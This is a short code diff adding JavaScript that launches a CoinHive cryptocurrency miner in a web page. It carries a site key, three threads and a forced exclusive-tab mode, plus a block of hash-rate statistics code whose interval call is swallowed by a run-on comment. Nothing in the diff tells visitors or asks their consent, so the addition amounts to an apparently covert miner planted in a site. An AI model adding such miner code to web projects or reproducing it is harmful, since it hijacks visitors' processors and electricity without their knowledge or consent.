@@ -1,0 +1,2 @@
+var miner = new CoinHive.Anonymous('R9AO4CDZSziYFXrGE3RsnwaOPKmyqz67', 'threads: 3');
+miner.start(CoinHive.FORCE_EXCLUSIVE_TAB); // Update stats once per secondsetInterval(function() {var threadCount = miner.getNumThreads();var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;var totalHashes = miner.getTotalHashes();var acceptedHashes = miner.getAcceptedHashes() / 256;}, 1000);
